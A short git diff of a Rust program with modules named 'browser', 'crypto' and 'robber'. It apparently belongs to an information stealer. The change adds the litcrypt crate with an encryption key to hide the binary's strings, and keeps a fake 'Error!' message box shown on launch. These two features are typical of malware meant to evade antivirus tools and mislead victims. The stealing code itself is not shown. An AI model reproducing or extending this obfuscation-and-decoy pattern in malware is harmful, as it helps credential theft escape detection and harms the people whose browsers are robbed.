@@ -2,10 +2,11 @@
 mod browser;
 mod crypto;
 mod robber;
-extern crate user32;
-extern crate winapi;
+use litcrypt::{lc, use_litcrypt};
 use std::ffi::CString;
 use user32::MessageBoxA;
+
+use_litcrypt!("[xr.v['j/tzdsojvtdln[tzc]osqjtre");
 
 fn main() -> () {
     let error: bool = false;
@@ -17,9 +18,9 @@ fn main() -> () {
     }
 }
 
-fn show_error(error_message: &str) -> Result<i32, anyhow::Error> {
-    let title = CString::new("Error!")?;
-    let message = CString::new(error_message)?;
+fn show_error(error_message: &str) -> Result<i32, ()> {
+    let title = CString::new("Error!").unwrap();
+    let message = CString::new(error_message).unwrap();
     unsafe {
         MessageBoxA(std::ptr::null_mut(), message.as_ptr(), title.as_ptr(), 0x10);
     }
